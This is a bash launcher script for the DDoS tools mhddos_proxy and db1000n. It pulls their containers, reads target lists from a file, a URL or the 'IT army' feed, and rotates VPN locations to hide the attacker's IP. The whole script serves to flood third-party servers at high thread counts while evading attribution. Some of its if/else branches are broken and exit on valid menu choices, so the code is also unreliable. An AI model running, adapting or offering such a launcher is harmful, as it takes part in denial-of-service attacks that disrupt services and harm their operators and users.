#!/bin/bash

clear

# File with targets
TARGETS=`cat targets.txt`

# Get ExpressVPN Activation Code
EXPRESSVPN_CODE=`cat expressvpn_activation_code`

MHDDOS_PROXY_SOURCE="ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest"
DB1000N_SOURCE="ghcr.io/arriven/db1000n:latest"

# Colors
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
RESET='\033[0m'

# VPN locations. Use 'expressvpn list all' to list all available locations
vpn_location[0]="il"
vpn_location[1]="dk"
vpn_location[2]="se"
vpn_location[3]="ee"
vpn_location[4]="hr"
vpn_location[5]="kz"

autostart_mode () {
  # Calculate the number of threads
  mhddos_threads

  # Run mhddos_proxy using proxy. Targets: targets.txt
  echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
  echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}disabled ${RESET}"
  echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
  echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
  echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}targets.txt ${RESET}"
  docker run -d --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE -t $MHDDOS_THREADS $TARGETS --table --debug
}

interactive_mode () {
    echo -en "
${YELLOW}
  _____ _                 _            ____           _               _
 / ____| |               | |          / __ \         | |             | |
| |    | | ___  _   _  __| | ___  ___| |  | |_ __ ___| |__   ___  ___| |_ _ __ __ _
| |    | |/ _ \| | | |/ _  |/ _ \/ __| |  | | __/ __ |  _ \ / _ \/ __| __|  __/ _  |
| |____| | (_) | |_| | (_| | (_) \__ \ |__| | | | (__| | | |  __/\__ \ |_| | | (_| |
 \_____|_|\___/ \__,_|\__,_|\___/|___/\____/|_|  \___|_| |_|\___||___/\__|_|  \__,_|
${RESET}

${YELLOW}Select DDOS utility: ${RESET}
${YELLOW}1.${RESET} mhddos_proxy
${YELLOW}2.${RESET} db1000n
${YELLOW}3.${RESET} Exit
Choose an option: "
    read -r option
    case $option in
    1)
        mhddos_configure
        ;;
    2)
        db1000n_configure
        ;;
    3)
        exit 0
        ;;
    *)
        echo -e "${RED}ERROR: Unknown parameter ${RESET}"
        exit 1
        ;;
    esac
}

expressvpn_configure () {
  echo -e "\n${YELLOW}Checking if VPN is activated${RESET}"
  if expressvpn status | grep -q "Not Activated"; then
    echo -e "${YELLOW}VPN is Not Activated. Let's activate it (takes up to 1 minute)...${RESET}"
    ./expressvpn.sh $EXPRESSVPN_CODE > /dev/null  || exit 1
  fi
  echo -e "\n${GREEN}VPN has been already activated.${RESET}"

  echo -e "\n${YELLOW}Disconnecting the current VPN session${RESET}"
  expressvpn disconnect
  rand=$[ $RANDOM % 6 ]
  VPN_LOCATION=`echo ${vpn_location[rand]}`

  echo -e "\n${YELLOW}Connecting to available VPN location${RESET}"
  echo -e "${GREEN}Selected VPN location: $VPN_LOCATION ${RESET}"
  expressvpn connect $VPN_LOCATION || exit 1
  sleep 5
  IP=`curl -s ifconfig.me`
  echo -e "${GREEN}Current IP: $IP ${RESET}"

  if expressvpn status | grep -q "Connected to"; then
    echo -e "${GREEN}VPN is successfully connected to: $VPN_LOCATION ${RESET}"
  else
    echo "${RED}VPN is Disabled! Abort the script!${RESET}"
    exit 1
  fi
}

mhddos_configure () {
    echo -ne "
${YELLOW}Select mhddos_proxy VPN type:${RESET}
1. Use my ExpressVPN
2. Use MHDDOS_PROXY proxy list without ExpressVPN
3. Use my ExpressVPN with MHDDOS_PROXY proxy list
Choose an option:  "
    read -r vpn

    echo -ne "
${YELLOW}Select mhddos_proxy source of targets:${RESET}
1. Use targets.txt local file
2. Use remote repository [URL]
3. Use --itarmy flag (targets are formed by IT army)
Choose an option:  "
    read -r source_of_targets

  mhddos_run
}

mhddos_threads () {
  CPU_NUMBER=`getconf _NPROCESSORS_ONLN`
  MHDDOS_THREADS=`expr $CPU_NUMBER \* 900`
}

mhddos_run () {
  # Calculate the number of threads
  mhddos_threads

  # Set up URL with targets
  if [ $source_of_targets == "2" ]; then
    echo -e "\n${YELLOW}Paste URL with targets for MHDDOS_PROXY:${RESET}"
    read -r source_of_targets_url
  fi

  echo -e "\n${YELLOW}Preparing to run: ${RESET}"

  # Run mhddos_proxy using ExpressVPN. Targets: targets.txt
  if [ $vpn == "1" -a $source_of_targets == "1" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}targets.txt ${RESET}"
    expressvpn_configure
    echo -e "${YELLOW}Wait till container is running...${RESET}"
    sleep 10
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE -t $MHDDOS_THREADS --vpn 100 $TARGETS --table --debug
  fi
  # Run mhddos_proxy using ExpressVPN. Targets: remote URL
  if [ $vpn == "1" -a $source_of_targets == "2" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN} $source_of_targets_url ${RESET}"
    expressvpn_configure
    echo -e "${YELLOW}Wait till container is running...${RESET}"
    sleep 10
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE  -t $MHDDOS_THREADS --vpn 100 -c $source_of_targets_url --table --debug
  fi
  # Run mhddos_proxy using ExpressVPN. Targets: --itarmy
  if [ $vpn == "1" -a $source_of_targets == "3" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}IT army ${RESET}"
    expressvpn_configure
    echo -e "${YELLOW}Wait till container is running...${RESET}"
    sleep 10
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE  -t $MHDDOS_THREADS --vpn 100 --itarmy --table --debug
  fi  

  # Run mhddos_proxy using proxy without ExpressVPN. Targets: targets.txt
  if [ $vpn == "2" -a $source_of_targets == "1" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}targets.txt ${RESET}"
    expressvpn disconnect
    sleep 5
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE -t $MHDDOS_THREADS $TARGETS --table --debug
  fi
  # Run mhddos_proxy using proxy without ExpressVPN. Targets: remote URL
  if [ $vpn == "2" -a $source_of_targets == "2" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}$source_of_targets_url ${RESET}"
    expressvpn disconnect
    sleep 5
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE  -t $MHDDOS_THREADS -c $source_of_targets_url --table --debug
  else
    echo -e "${RED}Error: Unknown parameter${RESET}"; exit 1
  fi
  # Run mhddos_proxy using proxy without ExpressVPN. Targets: --itarmy
  if [ $vpn == "2" -a $source_of_targets == "3" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}IT army ${RESET}"
    expressvpn disconnect
    sleep 5
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE  -t $MHDDOS_THREADS --itarmy --table --debug
  else
    echo -e "${RED}Error: Unknown parameter${RESET}"; exit 1
  fi

  # Run mhddos_proxy using proxy with ExpressVPN. Targets: targets.txt
  if [ $vpn == "3" -a $source_of_targets == "1" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}targets.txt ${RESET}"
    expressvpn_configure
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE -t $MHDDOS_THREADS $TARGETS --table --debug
  fi
  # Run mhddos_proxy using proxy with ExpressVPN. Targets: remote URL
  if [ $vpn == "3" -a $source_of_targets == "2" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}$source_of_targets_url ${RESET}"
    expressvpn_configure
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE  -t $MHDDOS_THREADS -c $source_of_targets_url --table --debug
  else
    echo -e "${RED}Error: Unknown parameter${RESET}"; exit 1
  fi
  # Run mhddos_proxy using proxy with ExpressVPN. Targets: --itarmy
  if [ $vpn == "3" -a $source_of_targets == "3" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}MHDDOS_PROXY ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS proxy list:  ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}MHDDOS threads:     ${RESET} ${GREEN}$MHDDOS_THREADS ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}IT army ${RESET}"
    expressvpn_configure
    docker run -it --rm --name mhddos_proxy_container --pull always $MHDDOS_PROXY_SOURCE  -t $MHDDOS_THREADS --itarmy --table --debug
  else
    echo -e "${RED}Error: Unknown parameter${RESET}"; exit 1
  fi
}

db1000n_configure () {
    echo -ne "
${YELLOW}SELECT db1000n VPN TYPE:${RESET}
1. Use my ExpressVPN
2. Don't use VPN (not recommended)
Choose an option:  "
    read -r vpn

  db1000n_run
}

db1000n_run () {
  echo -e "\n${YELLOW}PREPARING TO RUN: ${RESET}"

  # Run db1000n using ExpressVPN. Targets: managed remotely by db1000n team
  if [ $vpn == "1" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}db1000n ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${GREEN}enabled ${RESET}"
    echo -e "${YELLOW}db1000n threads:    ${RESET} ${GREEN}Managed automatically by db1000n ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}Managed remotely by db1000n team ${RESET}"
    expressvpn_configure
    echo -e "${YELLOW}Wait till container is running...${RESET}"
    sleep 10
    docker run -it --rm --name db1000n_container --pull always $DB1000N_SOURCE
  fi
  # Run db1000n without ExpressVPN. Targets: managed remotely by db1000n team
  if [ $vpn == "2" ]; then
    echo -e "${YELLOW}Utility:            ${RESET} ${GREEN}db1000n ${RESET}"
    echo -e "${YELLOW}ExpressVPN:         ${RESET} ${RED}disabled ${RESET}"
    echo -e "${YELLOW}db1000n threads:    ${RESET} ${GREEN}Managed automatically by db1000n ${RESET}"
    echo -e "${YELLOW}Targets:            ${RESET} ${GREEN}Managed remotely by db1000n team ${RESET}"

    echo -e "${RED}You haven't  selected ExpressVPN. db1000n will be started by exposing server's public IP.${RESET}"
    echo -e "${RED}Are you sure? [yes|y|no|n]${RESET}"
    read answ
    if [ $answ == "yes" -o $answ == "y" ]; then
      echo -e "${YELLOW}Wait till container is running...${RESET}"
      sleep 10
      docker run -it --rm --name db1000n_container --pull always $DB1000N_SOURCE
    else
      echo -e "${RED}Abort the script!${RESET}"
    fi
  fi
}

[ "$LOGNAME" != "root" ] && echo -e "${RED}You must be 'root' to run the script!${RESET}" && exit 1

if [ "$1" == "autostart=true" ]; then
  echo -e "${YELLOW}The script is being executed in 'autostart' mode${RESET}"
  autostart_mode $2
elif [ "$#" -eq 0 ]; then
  echo -e "${YELLOW}The script is being executed in 'interactive' mode${RESET}"
  interactive_mode
else
  echo -e "${RED}Error: Unknown parameter${RESET}"; exit 1
fi
